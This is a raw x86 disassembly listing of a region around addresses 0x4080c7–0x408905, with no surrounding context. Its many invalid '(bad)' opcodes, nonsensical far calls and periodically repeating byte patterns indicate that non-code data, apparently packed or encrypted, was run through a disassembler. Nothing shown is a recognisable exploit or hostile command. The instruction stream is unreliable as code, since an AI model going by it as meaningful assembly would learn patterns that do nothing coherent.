  4080c7:	ror    DWORD PTR gs:[edi-0x6f],1
  4080cb:	inc    eax
  4080cc:	outs   dx,BYTE PTR ds:[esi]
  4080cd:	or     eax,0x41a879b3
  4080d2:	inc    ebp
  4080d3:	inc    ecx
  4080d4:	inc    eax
  4080d5:	add    eax,0x41624340
  4080da:	test   BYTE PTR [eax],al
  4080dc:	and    eax,0x404043
  4080e1:	add    BYTE PTR ds:0x626210,al
  4080e7:	add    eax,0x43404140
  4080ec:	inc    eax
  4080ed:	inc    ecx
  4080ee:	add    eax,0x10664062
  4080f3:	inc    ebx
  4080f4:	bound  eax,QWORD PTR [eax+0x4e]
  4080f7:	imul   edx,DWORD PTR [ebp-0x30],0x40cf5811
  4080fe:	popa   
  4080ff:	xlat   BYTE PTR ds:[ebx]
  408100:	call   0x5d40:0x11e810e3
  408107:	xchg   ecx,eax
  408108:	ins    DWORD PTR es:[edi],dx
  408109:	nop
  40810a:	dec    esp
  40810b:	(bad)  
  40810c:	mov    al,ds:0x9c56140
  408111:	test   al,0xcd
  408113:	add    eax,0x4041cc
  408118:	add    BYTE PTR [eax],al
  40811a:	inc    eax
  40811b:	inc    eax
  40811c:	inc    ebx
  40811d:	bound  eax,QWORD PTR [eax]
  40811f:	inc    eax
  408120:	inc    eax
  408121:	add    eax,0x62434162
  408126:	inc    eax
  408127:	js     0x408139
  408129:	inc    ecx
  40812a:	add    eax,0x5404325
  40812f:	bound  eax,QWORD PTR [eax+0x40]
  408132:	inc    ecx
  408133:	inc    ebx
  408134:	js     0x408143
  408136:	inc    eax
  408137:	mov    ebx,0xb8102235
  40813c:	fs retf 
  40813e:	inc    eax
  40813f:	jb     0x40818c
  408141:	popf   
  408142:	dec    eax
  408143:	add    eax,0x214041ea
  408148:	adc    DWORD PTR [ebp+0x42],ebx
  40814b:	retf   
  40814c:	pushf  
  40814d:	gs inc eax
  40814f:	inc    ebp
  408150:	sbb    al,0x9f
  408152:	pusha  
  408153:	mov    esp,0xa2402462
  408158:	xchg   edi,eax
  408159:	mov    esp,0x7d7d1528
  40815e:	inc    eax
  40815f:	sub    DWORD PTR [eax],ebp
  408161:	stc    
  408162:	arpl   bx,cx
  408164:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408165:	dec    edx
  408166:	inc    eax
  408167:	dec    ecx
  408168:	adc    ecx,eax
  40816a:	jmp    0x43a2c294
  40816f:	add    BYTE PTR [eax],dl
  408171:	inc    eax
  408172:	add    BYTE PTR ds:0x62410040,al
  408178:	inc    eax
  408179:	add    BYTE PTR [ebx-0x34],al
  40817c:	inc    eax
  40817d:	add    eax,0x78434040
  408182:	bound  eax,QWORD PTR [ecx+0x78]
  408185:	add    eax,0x62404043
  40818a:	adc    DWORD PTR [esp+eax*2+0x40],esp
  40818e:	and    DWORD PTR [esp+edi*1],eax
  408191:	les    ebx,FWORD PTR [esi+edi*2+0x576c4086]
  408198:	retf   
  408199:	dec    edi
  40819a:	or     eax,0xe140b8ab
  40819f:	jl     0x40819f
  4081a1:	inc    ebx
  4081a2:	retf   
  4081a3:	xchg   ecx,eax
  4081a4:	adc    eax,0xf87f5c40
  4081a9:	dec    esp
  4081aa:	adc    BYTE PTR [esi+0x5d6d4043],bl
  4081b0:	stos   BYTE PTR es:[edi],al
  4081b1:	cmp    eax,0x54041a0
  4081b6:	inc    eax
  4081b7:	bound  eax,QWORD PTR [ebx+0x43]
  4081ba:	add    eax,0x62004040
  4081bf:	inc    eax
  4081c0:	add    BYTE PTR [ecx+0x40],al
  4081c3:	inc    ebx
  4081c4:	test   BYTE PTR ds:0x58054041,ah
  4081ca:	inc    eax
  4081cb:	inc    eax
  4081cc:	bound  eax,QWORD PTR [eax+0x66]
  4081cf:	inc    ecx
  4081d0:	inc    eax
  4081d1:	add    eax,0x40c8b000
  4081d6:	(bad)  
  4081d8:	push   edx
  4081d9:	ret    
  4081da:	xchg   ecx,eax
  4081db:	inc    ecx
  4081dc:	sub    al,0x40
  4081de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081df:	jge    0x4081d8
  4081e1:	mov    al,0xac
  4081e3:	mov    ecx,0x51844079
  4081e8:	test   eax,0xd41c0515
  4081ed:	inc    eax
  4081ee:	gs mov edi,0x1b43c910
  4081f4:	dec    edx
  4081f5:	inc    eax
  4081f6:	lahf   
  4081f7:	inc    ebp
  4081f8:	and    eax,0x445540a8
  4081fd:	inc    eax
  4081fe:	push   0x48f070
  408203:	add    BYTE PTR [ebx+0x40],al
  408206:	bound  eax,QWORD PTR ds:0x25404110
  40820c:	add    ah,cl
  40820e:	inc    ebx
  40820f:	add    eax,0x40402562
  408214:	add    BYTE PTR [eax+0x40],al
  408217:	inc    ecx
  408218:	inc    ecx
  408219:	add    eax,0x78434025
  40821e:	bound  eax,QWORD PTR [eax-0x7c]
  408221:	inc    eax
  408222:	inc    ecx
  408223:	inc    ebp
  408224:	(bad)  
  408225:	enter  0x2340,0x74
  408229:	cdq    
  40822a:	xor    eax,0x40bf4930
  40822f:	pop    ecx
  408230:	fs xchg ah,cl
  408233:	lods   al,BYTE PTR ds:[esi]
  408234:	push   esp
  408235:	inc    esi
  408236:	inc    eax
  408237:	mov    eax,ds:0x3d94b513
  40823c:	push   ebx
  40823d:	add    al,0x40
  40823f:	dec    ebp
  408240:	addr16 dec edi
  408242:	or     eax,0x40ca72c3
  408247:	arpl   WORD PTR [ebx],si
  408249:	test   ch,cl
  40824b:	mov    esp,0x4041b454
  408250:	inc    eax
  408251:	inc    ebx
  408252:	int3   
  408253:	add    BYTE PTR ds:0x56240,al
  408259:	inc    ebx
  40825a:	inc    eax
  40825b:	inc    eax
  40825c:	add    BYTE PTR [ecx+0x62],al
  40825f:	bound  eax,QWORD PTR [eax]
  408261:	int3   
  408262:	inc    eax
  408263:	inc    ebx
  408264:	add    eax,0x43624041
  408269:	adc    BYTE PTR [ecx+0x5],al
  40826c:	inc    eax
  40826d:	inc    eax
  40826e:	push   edx
  40826f:	fs pop ss
  408271:	dec    esp
  408272:	adc    eax,0xa5403563
  408277:	lahf   
  408278:	ret    0xc935
  40827b:	imul   eax,DWORD PTR [esi+0x40],0xffffffd3
  40827f:	push   esp
  408280:	dec    eax
  408281:	inc    edx
  408282:	test   al,0xcd
  408284:	cwde   
  408285:	inc    eax
  408286:	and    esi,DWORD PTR [ecx]
  408288:	mov    ah,0x43
  40828a:	inc    esp
  40828b:	add    DWORD PTR [eax+eax*2],edx
  40828e:	dec    edi
  40828f:	pop    ebp
  408290:	adc    DWORD PTR [edx],0x40625448
  408296:	loop   0x4082c9
  408298:	pop    ebx
  408299:	bound  eax,QWORD PTR [ebx+0x40]
  40829c:	adc    BYTE PTR ds:0x4158cc40,al
  4082a2:	inc    ebx
  4082a3:	bound  eax,QWORD PTR [ecx+0x40]
  4082a6:	add    eax,0x4140
  4082ab:	and    eax,0x40400062
  4082b0:	add    eax,0x84404340
  4082b5:	int3   
  4082b6:	js     0x4082b8
  4082b8:	inc    ecx
  4082b9:	adc    BYTE PTR [edx+0xf],ah
  4082bc:	fmul   st(0),st
  4082be:	xor    eax,0x47254040
  4082c3:	inc    ecx
  4082c4:	bound  edx,QWORD PTR [ecx-0x2cbf758a]
  4082ca:	xor    ebp,esp
  4082cc:	stos   DWORD PTR es:[edi],eax
  4082cd:	mov    edi,0x40002b9d
  4082d2:	inc    ecx
  4082d3:	inc    eax
  4082d4:	inc    ebx
  4082d5:	bound  ax,DWORD PTR ds:0x40434100
  4082dc:	add    eax,0x40054062
  4082e1:	bound  eax,QWORD PTR [ecx+0x40]
  4082e4:	inc    ebx
  4082e5:	inc    eax
  4082e6:	add    eax,0x25405841
  4082eb:	bound  eax,QWORD PTR [eax+0x43]
  4082ee:	inc    eax
  4082ef:	adc    BYTE PTR [eax-0x5f],al
  4082f2:	(bad)  
  4082f3:	cmp    esi,DWORD PTR [eax+0x40736370]
  4082f9:	mov    ebp,0x8052c4a
  4082fe:	in     al,dx
  4082ff:	fild   DWORD PTR [eax+0x16]
  408302:	rol    DWORD PTR [esi-0x37],1
  408305:	retf   
  408306:	sbb    BYTE PTR [eax+eax*2-0x5f],al
  40830a:	pop    ebp
  40830b:	aad    0xac
  40830d:	mov    edi,0x5f404562
  408312:	fild   QWORD PTR [ebp+0x3de3bf42]
  408318:	inc    eax
  408319:	loope  0x4082ff
  40831b:	mov    dl,0x3a
  40831d:	or     eax,0x42402690
  408322:	xor    esp,DWORD PTR [edx]
  408324:	or     al,0xfe
  408326:	push   edx
  408327:	inc    eax
  408328:	inc    ecx
  408329:	inc    ebx
  40832a:	inc    eax
  40832b:	add    eax,0x43406262
  408330:	inc    ecx
  408331:	adc    BYTE PTR [eax],al
  408333:	inc    eax
  408334:	add    eax,0x43000562
  408339:	add    BYTE PTR [ecx+0x40],al
  40833c:	inc    eax
  40833d:	add    eax,0x400062
  408342:	inc    ebx
  408343:	inc    eax
  408344:	js     0x408387
  408346:	inc    ecx
  408347:	bound  eax,QWORD PTR [eax+0x76]
  40834a:	inc    eax
  40834b:	gs inc ebp
  40834d:	inc    eax
  40834e:	arpl   WORD PTR [eax+0x354070c8],bp
  408354:	ror    DWORD PTR [esi],1
  408356:	mov    BYTE PTR [eax],dl
  408358:	dec    esp
  408359:	ds inc eax
  40835b:	popa   
  40835c:	and    al,ch
  40835e:	adc    eax,0x40623d0a
  408363:	dec    eax
  408364:	mov    dl,0x25
  408366:	int    0x44
  408368:	bound  eax,QWORD PTR [eax+0x5]
  40836b:	inc    ecx
  40836c:	add    BYTE PTR [ebx+0x40],al
  40836f:	inc    eax
  408370:	inc    ecx
  408371:	inc    eax
  408372:	inc    eax
  408373:	bound  eax,QWORD PTR ds:0x5624300
  408379:	add    BYTE PTR [eax+0x40],al
  40837c:	add    BYTE PTR [ecx+0x43],al
  40837f:	add    BYTE PTR [eax+0x41],al
  408382:	add    eax,0x40436200
  408387:	inc    eax
  408388:	add    eax,0x40434562
  40838d:	arpl   WORD PTR [eax+esi*2],dx
  408390:	dec    esi
  408391:	int    0xa8
  408393:	sub    al,0x40
  408395:	inc    edi
  408396:	popa   
  408397:	cwde   
  408398:	xor    eax,0x40ef30b8
  40839d:	and    ecx,esi
  40839f:	pop    esp
  4083a0:	inc    ecx
  4083a1:	adc    eax,0x5140444a
  4083a6:	js     0x4083d4
  4083a8:	dec    esp
  4083a9:	retf   
  4083aa:	bound  esp,QWORD PTR [edi+0x40]
  4083ad:	popa   
  4083ae:	push   ebx
  4083af:	and    DWORD PTR ds:0x40c940bc,edi
  4083b5:	push   edi
  4083b6:	mov    ebx,0x5f0dc322
  4083bb:	pop    ecx
  4083bc:	inc    eax
  4083bd:	and    DWORD PTR [ebp+0x2b],eax
  4083c0:	inc    ecx
  4083c1:	inc    eax
  4083c2:	add    eax,0x41624340
  4083c7:	test   BYTE PTR [eax],al
  4083c9:	and    eax,0x404043
  4083ce:	add    BYTE PTR ds:0x626210,al
  4083d4:	add    eax,0x43404140
  4083d9:	inc    eax
  4083da:	inc    ecx
  4083db:	add    eax,0x10664062
  4083e0:	inc    ebx
  4083e1:	bound  eax,QWORD PTR [esi-0x35]
  4083e4:	mov    edi,0xd8bf40ed
  4083e9:	sub    esp,DWORD PTR [ecx+0x42]
  4083ec:	mov    edi,0x3a4240bf
  4083f1:	adc    DWORD PTR [eax+0x40],ecx
  4083f4:	sub    BYTE PTR [eax-0x4bbf5ec0],ch
  4083fa:	gs push esi
  4083fc:	inc    eax
  4083fd:	adc    BYTE PTR [eax-0x5],al
  408400:	sub    DWORD PTR [esi+0x422a2cc0],esp
  408406:	inc    eax
  408407:	loope  0x40840e
  408409:	int3   
  40840a:	inc    ecx
  40840b:	inc    eax
  40840c:	add    BYTE PTR [eax],al
  40840e:	add    BYTE PTR [eax+0x40],al
  408411:	inc    ebx
  408412:	bound  eax,QWORD PTR [eax]
  408414:	inc    eax
  408415:	inc    eax
  408416:	add    eax,0x62434162
  40841b:	inc    eax
  40841c:	js     0x40842e
  40841e:	inc    ecx
  40841f:	add    eax,0x5404325
  408424:	bound  eax,QWORD PTR [eax+0x40]
  408427:	inc    ecx
  408428:	inc    ebx
  408429:	inc    ebp
  40842a:	and    ecx,DWORD PTR [eax+0x40411212]
  408430:	inc    eax
  408431:	xor    DWORD PTR [esp+ebx*4],ebx
  408434:	mov    ds:0x6c406148,al
  408439:	inc    esp
  40843a:	inc    ecx
  40843b:	out    0x91,al
  40843d:	inc    esi
  40843e:	lods   al,BYTE PTR ds:[esi]
  40843f:	inc    eax
  408440:	iret   
  408441:	icebp  
  408442:	rcr    DWORD PTR [ecx+0x406218a8],1
  408448:	or     esp,DWORD PTR fs:[ebx+eiz*2]
  40844c:	adc    eax,0x6241259c
  408451:	inc    ebx
  408452:	add    BYTE PTR [eax],dl
  408454:	inc    eax
  408455:	add    BYTE PTR ds:0x62410040,al
  40845b:	inc    eax
  40845c:	add    BYTE PTR [ebx-0x34],al
  40845f:	inc    eax
  408460:	add    eax,0x78434040
  408465:	bound  eax,QWORD PTR [ecx+0x78]
  408468:	add    eax,0x62404043
  40846d:	jle    0x4084af
  40846f:	cs mov bl,0x2c
  408472:	call   0x5b4c:0x402462cb
  408479:	xlat   BYTE PTR ds:[ebx]
  40847a:	add    eax,0x403f3167
  40847f:	and    DWORD PTR [ebp+0x834f348],edx
  408485:	je     0x4084c7
  408487:	dec    eax
  408488:	iret   
  408489:	sub    eax,0xd1644036
  40848e:	inc    eax
  40848f:	in     eax,0x6f
  408491:	jge    0x4084f8
  408493:	test   al,0x41
  408495:	inc    esi
  408496:	inc    eax
  408497:	mov    edx,DWORD PTR [ebx]
  408499:	ins    DWORD PTR es:[edi],dx
  40849a:	cwde   
  40849b:	cmp    eax,0x46403cb8
  4084a0:	jle    0x4084e1
  4084a2:	adc    eax,0x404149c3
  4084a7:	add    eax,0x43436240
  4084ac:	add    eax,0x62004040
  4084b1:	inc    eax
  4084b2:	add    BYTE PTR [ecx+0x40],al
  4084b5:	inc    ebx
  4084b6:	test   BYTE PTR ds:0x58054041,ah
  4084bc:	inc    eax
  4084bd:	inc    eax
  4084be:	bound  eax,QWORD PTR [eax+0x66]
  4084c1:	inc    ecx
  4084c2:	inc    eax
  4084c3:	add    eax,0x25404a00
  4084c8:	shr    DWORD PTR [edx],1
  4084ca:	std    
  4084cb:	inc    eax
  4084cc:	push   0x50ca4006
  4084d1:	dec    ebp
  4084d2:	dec    edx
  4084d3:	inc    eax
  4084d4:	push   ss
  4084d5:	test   al,0x40
  4084d7:	and    DWORD PTR [edi],esi
  4084d9:	sti    
  4084da:	fs inc eax
  4084dc:	clc    
  4084dd:	adc    al,BYTE PTR [eax+0x60]
  4084e0:	inc    edi
  4084e1:	mov    eax,ds:0x430000fa
  4084e6:	inc    eax
  4084e7:	bound  eax,QWORD PTR ds:0x25404110
  4084ed:	add    ah,cl
  4084ef:	inc    ebx
  4084f0:	add    eax,0x40402562
  4084f5:	add    BYTE PTR [eax+0x40],al
  4084f8:	inc    ecx
  4084f9:	inc    ecx
  4084fa:	add    eax,0x78434025
  4084ff:	bound  eax,QWORD PTR [eax-0x7c]
  408502:	inc    eax
  408503:	inc    ecx
  408504:	(bad)  
  408505:	bound  ebx,QWORD PTR [eax+eax*2+0x63]
  408509:	fisttp DWORD PTR [esi-0x6a]
  40850c:	les    ecx,FWORD PTR [ebp+0x11]
  40850f:	inc    eax
  408510:	adc    BYTE PTR [edi-0x28],0xed
  408514:	dec    edi
  408515:	in     al,dx
  408516:	retf   
  408517:	inc    eax
  408518:	jecxz  0x408571
  40851a:	pop    eax
  40851b:	jb     0x40856c
  40851d:	ins    BYTE PTR es:[edi],dx
  40851e:	dec    eax
  40851f:	inc    eax
  408520:	xor    ch,dh
  408522:	(bad)  
  408523:	push   sp
  408525:	imul   eax,DWORD PTR [ebp+0x40],0xffffffe1
  408529:	inc    ecx
  40852a:	inc    eax
  40852b:	inc    eax
  40852c:	inc    ebx
  40852d:	int3   
  40852e:	add    BYTE PTR ds:0x56240,al
  408534:	inc    ebx
  408535:	inc    eax
  408536:	inc    eax
  408537:	add    BYTE PTR [ecx+0x62],al
  40853a:	bound  eax,QWORD PTR [eax]
  40853c:	int3   
  40853d:	inc    eax
  40853e:	inc    ebx
  40853f:	add    eax,0x43624041
  408544:	adc    BYTE PTR [ecx+0x5],al
  408547:	inc    eax
  408548:	push   ecx
  408549:	dec    ecx
  40854a:	xchg   esp,eax
  40854b:	sub    al,0xf8
  40854d:	repnz inc eax
  40854f:	push   esp
  408550:	shr    eax,cl
  408552:	inc    esi
  408553:	ret    
  408554:	jmp    0x40858a
  408556:	inc    eax
  408557:	and    DWORD PTR [ebx-0x32],esi
  40855a:	test   eax,0x405ea0bf
  40855f:	inc    esp
  408560:	ins    DWORD PTR es:[edi],dx
  408561:	dec    edi
  408562:	xchg   edx,eax
  408563:	mov    edi,0x2340f86d
  408568:	mov    bl,0x40
  40856a:	cwde   
  40856b:	fisub  DWORD PTR [ebx]
  40856d:	mov    ah,0x40
  40856f:	pop    ss
  408570:	mov    edi,0x6838b5b9
  408575:	or     eax,0x747fa240
  40857a:	bound  eax,QWORD PTR [ebx+0x40]
  40857d:	adc    BYTE PTR ds:0x4158cc40,al
  408583:	inc    ebx
  408584:	bound  eax,QWORD PTR [ecx+0x40]
  408587:	add    eax,0x4140
  40858c:	and    eax,0x40400062
  408591:	add    eax,0x84404340
  408596:	int3   
  408597:	js     0x408599
  408599:	inc    ecx
  40859a:	adc    BYTE PTR [edx+0xf],ah
  40859d:	bound  ebp,QWORD PTR [eax-0x40bf34ac]
  4085a3:	jno    0x4085dd
  4085a5:	jae    0x4085b8
  4085a7:	test   eax,0x4c274010
  4085ac:	inc    edi
  4085ad:	nop
  4085ae:	mov    eax,0x5340a06f
  4085b3:	jnp    0x40853e
  4085b5:	or     eax,0x4042210d
  4085ba:	mov    eax,ds:0xcdeae24b
  4085bf:	data16 adc al,0x40
  4085c2:	dec    ecx
  4085c3:	jno    0x40856d
  4085c5:	mov    bl,0x10
  4085c7:	add    BYTE PTR ds:[eax+0x41],al
  4085cb:	inc    eax
  4085cc:	inc    ebx
  4085cd:	bound  ax,DWORD PTR ds:0x40434100
  4085d4:	add    eax,0x40054062
  4085d9:	bound  eax,QWORD PTR [ecx+0x40]
  4085dc:	inc    ebx
  4085dd:	inc    eax
  4085de:	add    eax,0x25405841
  4085e3:	bound  eax,QWORD PTR [eax+0x43]
  4085e6:	inc    eax
  4085e7:	adc    BYTE PTR [eax+0x40],al
  4085ea:	bound  eax,QWORD PTR [eax-0x8]
  4085ed:	fs inc edx
  4085ef:	fsub   DWORD PTR [eax+eax*2+0x2f]
  4085f3:	nop
  4085f4:	xchg   esp,eax
  4085f5:	stc    
  4085f6:	push   edx
  4085f7:	mov    ch,0xbb
  4085f9:	inc    eax
  4085fa:	inc    edx
  4085fb:	es jae 0x40858c
  4085fe:	add    al,0xfc
  408600:	pushf  
  408601:	inc    eax
  408602:	loope  0x408612
  408604:	fild   WORD PTR ds:0x407462cd
  40860a:	inc    ecx
  40860b:	inc    ebx
  40860c:	inc    eax
  40860d:	add    eax,0x43406262
  408612:	inc    ecx
  408613:	adc    BYTE PTR [eax],al
  408615:	inc    eax
  408616:	add    eax,0x43000562
  40861b:	add    BYTE PTR [ecx+0x40],al
  40861e:	inc    eax
  40861f:	add    eax,0x400062
  408624:	inc    ebx
  408625:	inc    eax
  408626:	js     0x408669
  408628:	inc    ecx
  408629:	bound  eax,QWORD PTR [eax+0x40]
  40862c:	xor    BYTE PTR [esi-0x1],dl
  40862f:	(bad)  
  408630:	mov    BYTE PTR [edx],dh
  408632:	fs inc eax
  408634:	daa    
  408635:	and    esp,DWORD PTR [ebx+esi*4+0x40632015]
  40863c:	ss jnp 0x408624
  40863f:	fs inc ebx
  408641:	shl    DWORD PTR [eax+eax*2-0x5d],cl
  408645:	bound  eax,QWORD PTR [eax+0x5]
  408648:	inc    ecx
  408649:	add    BYTE PTR [ebx+0x40],al
  40864c:	inc    eax
  40864d:	inc    ecx
  40864e:	inc    eax
  40864f:	inc    eax
  408650:	bound  eax,QWORD PTR ds:0x5624300
  408656:	add    BYTE PTR [eax+0x40],al
  408659:	add    BYTE PTR [ecx+0x43],al
  40865c:	add    BYTE PTR [eax+0x41],al
  40865f:	add    eax,0x40436200
  408664:	inc    eax
  408665:	add    eax,0xf8461162
  40866a:	mov    esp,0x5940d02d
  40866f:	mov    ch,0xf6
  408671:	mov    WORD PTR ds:0x214083a8,ss
  408677:	fs cmc 
  408679:	adc    eax,0x406da2cb
  40867e:	das    
  40867f:	xor    DWORD PTR [edi-0x2b],ebx
  408682:	inc    eax
  408683:	aas    
  408684:	inc    ecx
  408685:	inc    eax
  408686:	add    eax,0x41624340
  40868b:	test   BYTE PTR [eax],al
  40868d:	and    eax,0x404043
  408692:	add    BYTE PTR ds:0x626210,al
  408698:	add    eax,0x43404140
  40869d:	inc    eax
  40869e:	inc    ecx
  40869f:	add    eax,0x10664062
  4086a4:	inc    ebx
  4086a5:	bound  esi,QWORD PTR [ecx]
  4086a7:	inc    eax
  4086a8:	inc    esp
  4086a9:	xor    DWORD PTR es:[edi+0x40484040],ebx
  4086b0:	and    DWORD PTR [ebp-0xf],esi
  4086b3:	fs inc eax
  4086b5:	jp     0x408715
  4086b7:	inc    eax
  4086b8:	pop    edx
  4086b9:	dec    esi
  4086ba:	(bad)  
  4086bd:	popf   
  4086be:	and    eax,0xc930a540
  4086c3:	mov    al,ah
  4086c5:	push   edx
  4086c6:	cs inc eax
  4086c8:	adc    DWORD PTR [ecx],eax
  4086ca:	scas   eax,DWORD PTR es:[edi]
  4086cb:	in     al,dx
  4086cc:	dec    edi
  4086cd:	retf   
  4086ce:	dec    esi
  4086cf:	inc    eax
  4086d0:	popa   
  4086d1:	pop    edx
  4086d2:	add    eax,0x4041cc
  4086d7:	add    BYTE PTR [eax],al
  4086d9:	inc    eax
  4086da:	inc    eax
  4086db:	inc    ebx
  4086dc:	bound  eax,QWORD PTR [eax]
  4086de:	inc    eax
  4086df:	inc    eax
  4086e0:	add    eax,0x62434162
  4086e5:	inc    eax
  4086e6:	js     0x4086f8
  4086e8:	inc    ecx
  4086e9:	add    eax,0x5404325
  4086ee:	bound  eax,QWORD PTR [eax+0x40]
  4086f1:	inc    ecx
  4086f2:	inc    ebx
  4086f3:	xchg   ebp,eax
  4086f4:	xchg   edx,eax
  4086f5:	mov    al,dl
  4086f7:	test   al,0x40
  4086f9:	dec    edi
  4086fa:	jne    0x40874c
  4086fc:	or     ax,0x11df
  408700:	inc    eax
  408701:	popa   
  408702:	jp     0x40876e
  408704:	mov    cl,cl
  408706:	test   al,0x41
  408708:	inc    eax
  408709:	inc    eax
  40870a:	je     0x4086e4
  40870c:	hlt    
  40870d:	mov    al,0xca
  40870f:	add    DWORD PTR [eax-0x60],0xded926e
  408716:	xor    bl,al
  408718:	and    eax,0x436241
  40871d:	adc    BYTE PTR [eax+0x0],al
  408720:	add    eax,0x62410040
  408725:	inc    eax
  408726:	add    BYTE PTR [ebx-0x34],al
  408729:	inc    eax
  40872a:	add    eax,0x78434040
  40872f:	bound  eax,QWORD PTR [ecx+0x78]
  408732:	add    eax,0x62404043
  408737:	inc    eax
  408738:	xor    BYTE PTR [edi+0x60],al
  40873b:	fs inc ebx
  40873d:	gs mov al,0x40
  408740:	sub    esi,DWORD PTR [eax-0x5b539104]
  408746:	inc    ebp
  408747:	inc    eax
  408748:	popa   
  408749:	lods   eax,DWORD PTR ds:[esi]
  40874a:	inc    ecx
  40874b:	clc    
  40874c:	or     eax,0x4a405962
  408751:	sub    eax,0x7b43049b
  408756:	rol    BYTE PTR [eax-0x5f],1
  408759:	inc    ebp
  40875a:	xor    edx,esi
  40875c:	test   al,0x33
  40875e:	int    0x40
  408760:	mov    ebx,0x40054041
  408765:	bound  eax,QWORD PTR [ebx+0x43]
  408768:	add    eax,0x62004040
  40876d:	inc    eax
  40876e:	add    BYTE PTR [ecx+0x40],al
  408771:	inc    ebx
  408772:	test   BYTE PTR ds:0x58054041,ah
  408778:	inc    eax
  408779:	inc    eax
  40877a:	bound  eax,QWORD PTR [eax+0x66]
  40877d:	inc    ecx
  40877e:	inc    eax
  40877f:	add    eax,0x8f46f200
  408784:	or     eax,0x48402b46
  408789:	outs   dx,BYTE PTR ds:[esi]
  40878a:	ss out dx,al
  40878c:	retf   
  40878d:	cwd    
  40878f:	inc    eax
  408790:	loope  0x4087d7
  408792:	pushf  
  408793:	mov    al,ds:0x406f13b0
  408798:	inc    esi
  408799:	fwait
  40879a:	add    DWORD PTR ds:0x404a6656,eax
  4087a0:	loope  0x4087e4
  4087a2:	rol    BYTE PTR [edi+0x40447e40],1
  4087a8:	inc    ebx
  4087a9:	mov    bl,0xf6
  4087ab:	sub    al,0x46
  4087ad:	imul   eax,DWORD PTR [esi+0x26412140],0xa8ac22
  4087b7:	add    BYTE PTR [ebx+0x40],al
  4087ba:	bound  eax,QWORD PTR ds:0x25404110
  4087c0:	add    ah,cl
  4087c2:	inc    ebx
  4087c3:	add    eax,0x40402562
  4087c8:	add    BYTE PTR [eax+0x40],al
  4087cb:	inc    ecx
  4087cc:	inc    ecx
  4087cd:	add    eax,0x78434025
  4087d2:	bound  eax,QWORD PTR [eax-0x7c]
  4087d5:	inc    eax
  4087d6:	inc    ecx
  4087d7:	mov    al,0x40
  4087d9:	push   edi
  4087da:	push   eax
  4087db:	ins    DWORD PTR es:[edi],dx
  4087dc:	call   0x405589c5
  4087e1:	and    DWORD PTR [ebx],esi
  4087e3:	jge    0x408861
  4087e5:	test   al,0x9b
  4087e7:	retf   
  4087e8:	inc    eax
  4087e9:	inc    esi
  4087ea:	inc    ecx
  4087eb:	sub    DWORD PTR [eax+0x4040c310],0x5213ba1
  4087f5:	xchg   esp,eax
  4087f6:	adc    BYTE PTR [eax+0x5d1d5640],cl
  4087fc:	xchg   DWORD PTR [ecx+0x52],eax
  4087ff:	inc    esi
  408800:	inc    eax
  408801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408802:	loope  0x4087ef
  408804:	jno    0x408846
  408806:	test   eax,0x41044032
  40880b:	inc    eax
  40880c:	inc    eax
  40880d:	inc    ebx
  40880e:	int3   
  40880f:	add    BYTE PTR ds:0x56240,al
  408815:	inc    ebx
  408816:	inc    eax
  408817:	inc    eax
  408818:	add    BYTE PTR [ecx+0x62],al
  40881b:	bound  eax,QWORD PTR [eax]
  40881d:	int3   
  40881e:	inc    eax
  40881f:	inc    ebx
  408820:	add    eax,0x43624041
  408825:	adc    BYTE PTR [ecx+0x5],al
  408828:	inc    eax
  408829:	aad    0x18
  40882b:	nop
  40882c:	mov    WORD PTR [eax+0x696240e8],?
  408832:	sub    BYTE PTR [edx+ebp*2],ah
  408835:	xchg   edi,eax
  408836:	xor    eax,DWORD PTR [eax+0x2f]
  408839:	mov    cl,0xc
  40883b:	retf   0xde04
  40883e:	loopne 0x4088a2
  408840:	inc    ebx
  408841:	inc    eax
  408842:	adc    BYTE PTR ds:0x4158cc40,al
  408848:	inc    ebx
  408849:	bound  eax,QWORD PTR [ecx+0x40]
  40884c:	add    eax,0x4140
  408851:	and    eax,0x40400062
  408856:	add    eax,0x84404340
  40885b:	int3   
  40885c:	js     0x40885e
  40885e:	inc    ecx
  40885f:	adc    BYTE PTR [edx+0xf],ah
  408862:	inc    eax
  408863:	mov    esi,0x46ac5167
  408868:	arpl   WORD PTR [edx+0x40],sp
  40886b:	lea    edx,[edx]
  40886d:	outs   dx,DWORD PTR ds:[esi]
  40886e:	add    eax,0x405d48cd
  408873:	loope  0x40889f
  408875:	das    
  408876:	xchg   DWORD PTR [eax],ecx
  408878:	inc    ebp
  408879:	pushf  
  40887a:	inc    eax
  40887b:	dec    ebx
  40887c:	adc    bh,BYTE PTR [eax*2+0x406719d5]
  408883:	loope  0x408878
  408885:	mov    DWORD PTR [eax-0x33],0x40414000
  40888c:	inc    ebx
  40888d:	bound  ax,DWORD PTR ds:0x40434100
  408894:	add    eax,0x40054062
  408899:	bound  eax,QWORD PTR [ecx+0x40]
  40889c:	inc    ebx
  40889d:	inc    eax
  40889e:	add    eax,0x25405841
  4088a3:	bound  eax,QWORD PTR [eax+0x43]
  4088a6:	inc    eax
  4088a7:	adc    BYTE PTR [edi-0x10],ah
  4088aa:	inc    eax
  4088ab:	add    al,0x42
  4088ad:	icebp  
  4088ae:	jl     0x4088c1
  4088b0:	ins    BYTE PTR es:[edi],dx
  4088b1:	mov    al,ds:0x4bb4e140
  4088b6:	xor    al,0x94
  4088b8:	ja     0x40891e
  4088ba:	inc    eax
  4088bb:	jp     0x40892b
  4088bd:	test   eax,0x40434140
  4088c2:	add    eax,0x43406262
  4088c7:	inc    ecx
  4088c8:	adc    BYTE PTR [eax],al
  4088ca:	inc    eax
  4088cb:	add    eax,0x43000562
  4088d0:	add    BYTE PTR [ecx+0x40],al
  4088d3:	inc    eax
  4088d4:	add    eax,0x400062
  4088d9:	inc    ebx
  4088da:	inc    eax
  4088db:	js     0x40891e
  4088dd:	inc    ecx
  4088de:	bound  eax,QWORD PTR [eax+0x62]
  4088e1:	or     eax,0xa040a4dd
  4088e6:	inc    eax
  4088e7:	fs test eax,0x40a810cd
  4088ed:	sub    al,0x52
  4088ef:	xchg   BYTE PTR [esp+eax*2+0x1b404bd0],bh
  4088f6:	lods   eax,DWORD PTR ds:[esi]
  4088f7:	dec    esp
  4088f8:	or     DWORD PTR [eax+0x68],eax
  4088fb:	sub    al,BYTE PTR [eax-0x5f]
  4088fe:	aaa    
  4088ff:	cdq    
  408900:	cmp    BYTE PTR ss:[eax+edx*2],bl
  408904:	inc    eax
  408905:	push   edx
